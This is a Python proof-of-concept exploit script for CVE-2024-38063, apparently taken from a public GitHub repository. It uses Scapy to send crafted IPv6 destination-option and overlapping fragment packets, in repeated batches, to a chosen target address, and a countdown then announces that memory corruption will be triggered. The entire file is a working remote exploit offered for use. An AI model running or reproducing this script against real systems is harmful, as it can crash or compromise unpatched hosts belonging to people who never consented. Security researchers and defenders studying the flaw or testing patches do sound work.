##
## https://github.com/ynwarcs/CVE-2024-38063/blob/main/script/cve-2024-38063.py
## CVE-2024-38063
##

import argparse
from scapy.all import *
import time,logging
import os,sys,re

# Constants
FRAG_ID_BASE = 0xdebac1e  # Base fragment ID

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def create_packets(i, ip_addr, mac_addr=None):
    """Generate fragmented packets based on the iteration index."""
    frag_id = FRAG_ID_BASE + i
    dst_mac = mac_addr if mac_addr else None
    
    first = (Ether(dst=dst_mac) / IPv6(fl=1, hlim=64 + i, dst=ip_addr) /
             IPv6ExtHdrDestOpt(options=[PadN(otype=0x81, optdata='a'*3)]))
    second = (Ether(dst=dst_mac) / IPv6(fl=1, hlim=64 + i, dst=ip_addr) /
              IPv6ExtHdrFragment(id=frag_id, m=1, offset=0) / 'aaaaaaaa')
    third = (Ether(dst=dst_mac) / IPv6(fl=1, hlim=64 + i, dst=ip_addr) /
             IPv6ExtHdrFragment(id=frag_id, m=0, offset=1))
    
    return [first, second, third]

def get_packets(i, ip_addr, mac_addr):
    """Return packets based on whether a MAC address is specified."""
    return create_packets(i, ip_addr, mac_addr)

def validate_inputs(iface, ip_addr):
    """Validate that required inputs are provided."""
    if not iface:
        raise ValueError("Interface (iface) must be set.")
    if not ip_addr:
        raise ValueError("IP address (ip_addr) must be set.")

def main(args):
    validate_inputs(args.iface, args.ip_addr)

    final_ps = []

    for batch in range(args.num_batches):
        for i in range(args.num_tries):
            final_ps += get_packets(i, args.ip_addr, args.mac_addr) + get_packets(i, args.ip_addr, args.mac_addr)
        
        logging.info(f"Batch {batch + 1}/{args.num_batches} prepared")

    # Send packets
    logging.info("Sending packets")
    if args.mac_addr:
        sendp(final_ps, iface=args.iface)
    else:
        send(final_ps, iface=args.iface)

    # Countdown timer
    for i in range(60, 0, -1):
        print(f"\rMemory corruption will be triggered in {i} seconds", end='')
        time.sleep(1)
    print("")


if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Packet fragmentation script using Scapy.")
    
    parser.add_argument('--iface', required=True, help="Network interface to use (e.g., eth0).")
    parser.add_argument('--ip_addr', required=True, help="Target IPv6 address.")
    parser.add_argument('--mac_addr', default=None, help="Target MAC address (optional).")
    parser.add_argument('--num_tries', type=int, default=20, help="Number of tries per batch (default: 20).")
    parser.add_argument('--num_batches', type=int, default=20, help="Number of batches (default: 20).")

    args = parser.parse_args()
    
    try:
        main(args)
    except Exception as e:
        logging.error(f"An error occurred: {e}")

##
##
